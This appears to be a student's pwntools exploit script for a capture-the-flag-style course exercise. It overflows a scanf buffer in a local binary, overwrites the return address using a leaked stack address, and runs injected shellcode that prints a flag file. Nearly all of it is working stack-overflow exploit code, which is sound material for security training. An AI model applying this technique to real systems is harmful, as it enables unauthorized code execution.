#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise2/exercise2b'
exe = './exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

# (Static) Analysis:
# Vuln.: scanf in check_authorization -> can overflow buffer and reprogram return address


# From description:
# 1) Spawn shell -> https://docs.pwntools.com/en/stable/shellcraft/amd64.html (on local machine i386) or direct via https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.cat
# 2) cat flag -> how cat flag?

'''
arch     x86
baddr    0x400000
binsz    14993
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
# From description:
# 1) Spawn shell -> https://docs.pwntools.com/en/stable/shellcraft/amd64.html (on local machine i386) or direct via https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.cat
# 2) cat flag -> how cat flag?

#From static analysis: instead of having 96 bytes as buffer in stack (as before), we only have now 16 bytes.
#The exploit we used before uses 34 + b + 1 + 8 bytes = 43 + b bytes, where b is the number of bytes places in stack to fill it up.

#Idea: make us of red zone -> cannot write into red zone

shell_cat_flag = asm(shellcraft.amd64.linux.cat("flag")) #link says 43, ubuntu says 33
remaining_buffer_size = 16 
#also main allocates 16 bytes into the stack
    
#    print("Size of shell_cat_flag: ", end="")
#    print(len(shell_cat_flag))
#    print(shell_cat_flag)
    
main_rbp_overwrite = b'BBBBBBBB'
    
    #remove 0x, newline; invert sequence (little endian) and append 0s
to_main_ret_address_overwrite =  r.recvline()
#    print("Address: ", end="") #b'0x7ffe3e5c9ac0\n' keep in mind relocs in set to true
#    print(to_main_ret_address_overwrite)

#https://blog.finxter.com/how-to-convert-hex-string-to-integer-in-python/#:~:text=Hex%20String%20to%20Integer%20using,string%20is%20a%20hex%20number
#conversion
#this address now points the stack slot allocated by main; place exploit into the stack slot allocated by main, and overwrite everything setup by main
to_main_ret_address_overwrite = hex(int(to_main_ret_address_overwrite[2:-1].decode(), base=16) + 24).encode() + b"\n"
    
to_main_ret_address_overwrite = bytes(bytearray(bytes.fromhex(to_main_ret_address_overwrite[2:-1].decode())))[::-1]
to_main_ret_address_overwrite = to_main_ret_address_overwrite + (8 - len(to_main_ret_address_overwrite)) * b"\x00"
    
#    print("Final Address: ", end="") #b'0x7ffe3e5c9ac0\n' keep in mind relocs in set to true
#    print(to_main_ret_address_overwrite)
    
fill_buffer = b'A' * remaining_buffer_size
    
#    print(shell_cat_flag + fill_buffer + main_rbp_overwrite + to_main_ret_address_overwrite)
    
r.sendline(fill_buffer + main_rbp_overwrite + to_main_ret_address_overwrite + shell_cat_flag)
print(r.recvall(timeout=10)) 


